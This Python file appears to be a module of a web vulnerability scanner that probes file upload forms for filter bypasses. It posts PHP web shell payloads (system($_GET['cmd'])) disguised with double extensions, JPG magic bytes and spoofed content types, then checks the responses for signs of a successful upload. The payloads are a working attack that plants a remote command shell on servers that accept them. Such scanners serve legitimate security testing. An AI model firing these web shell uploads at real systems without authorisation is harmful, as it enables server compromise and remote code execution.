from scan_engine.helpers.http_client import get_session
import os
import re

class UploadExpertScanner:
    """
    Expert Auditor for File Upload Bypass.
    Tests extension blacklists, content-type spoofing, and Magic Byte injection.
    """
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        self.session = get_session(self.options)
        
        # Magic bytes for common types to bypass signature checks
        self.magic_bytes = {
            "jpg": b"\xFF\xD8\xFF\xDB",
            "png": b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A",
            "gif": b"GIF89a"
        }

    def _is_static_asset(self, url):
        """Check if URL points to a static asset that shouldn't handle uploads."""
        static_exts = {'.js', '.css', '.map', '.png', '.jpg', '.jpeg', '.svg', '.gif', '.ico', '.woff', '.woff2', '.ttf'}
        path = url.split('?')[0].lower()
        if any(path.endswith(ext) for ext in static_exts):
            return True
        
        # Exclude common static directories
        static_dirs = ['/js/', '/css/', '/assets/', '/static/', '/wp-includes/', '/wp-admin/js/', '/wp-admin/css/']
        if any(sd in path for sd in static_dirs):
            return True
            
        return False

    def scan_upload_form(self, action_url, file_param="file", logger=None):
        findings = []
        
        if self._is_static_asset(action_url):
            if logger: logger(f"Upload Expert: Skipping static asset {action_url}", "DEBUG")
            return []

        if logger: logger(f"Upload Expert: Testing bypass on {action_url}...", "INFO")

        # Attack Payloads
        payloads = [
            # 1. Simple PHP shell with JPG extension (if server only checks extension)
            {"filename": "shell.php.jpg", "content": b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
            # 2. Magic Byte Injection (JPG signature at start of PHP code)
            {"filename": "magic_shell.php", "content": self.magic_bytes["jpg"] + b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
            # 3. Double extension bypass
            {"filename": "shell.php.png", "content": b"<?php phpinfo(); ?>", "type": "image/png"},
            # 4. Content-Type Spoofing only
            {"filename": "shell_spoof.php", "content": b"<?php echo 'RedOps3'; ?>", "type": "image/jpeg"}
        ]

        for p in payloads:
            try:
                files = {file_param: (p["filename"], p["content"], p["type"])}
                # Test the upload
                resp = self.session.post(action_url, files=files, timeout=7)
                
                # REFINED SUCCESS INDICATORS (Avoid broad 200/201 without context)
                # We look for structured indications of success
                body = resp.text.lower()
                headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                
                # A 200/201 is necessary but not sufficient
                if resp.status_code not in [200, 201]:
                    continue

                # Evidence of successful upload processing
                is_success = False
                affirmative = any(ind in body for ind in ["\"success\":true", "'success':true", "upload successful", "file saved", "file_name", "upload_id"])
                
                # Check for 201 Created (Strong signal)
                if resp.status_code == 201:
                    is_success = True
                
                # Check for location header or JSON response with path
                if 'location' in headers and p['filename'] in headers['location']:
                    is_success = True
                
                # Hard gate: Reflection != Success
                filename_reflected = p['filename'] in body
                if affirmative:
                    is_success = True
                elif filename_reflected:
                    # If only the filename is there, it might be an error message reflecting the input
                    # or a static file echoing params. We need more proof.
                    if any(err in body for err in ["error", "failed", "denied", "invalid", "not allowed"]):
                        is_success = False
                    else:
                        # Ambiguous: could be a success without 'success' keyword
                        # but we cap confidence
                        is_success = "ambiguous"

                if is_success:
                    severity = "high" if is_success is True else "medium"
                    label = "Bypass Potential" if is_success is True else "Ambiguous Upload Behavior"
                    
                    # V12: Final check - if it's on a .js or .css file despite the early check, it's garbage
                    if self._is_static_asset(action_url):
                        continue

                    # Proof snippet
                    proof = body[:500].replace('\n', ' ')
                    
                    findings.append({
                        "title": f"File Upload {label}",
                        "description": (
                            f"Successfully sent a suspicious file: `{p['filename']}`\n"
                            f"Method: {p.get('method', 'Signature/Extension Spoofing')}\n"
                            f"Action URL: {action_url}\n"
                            f"Response Code: {resp.status_code}\n"
                            f"Evidence: {proof}..."
                        ),
                        "severity": severity,
                        "tool_source": "upload_expert",
                        "url": action_url,
                        "raw_loot": f"Payload: {p['filename']} sent with Content-Type: {p['type']}",
                        "confidence": "high" if is_success is True else "low"
                    })
                    if logger: logger(f"{severity.upper()}: Upload {label} at {action_url}", "WARN")
            except Exception:
                pass
        
        return findings
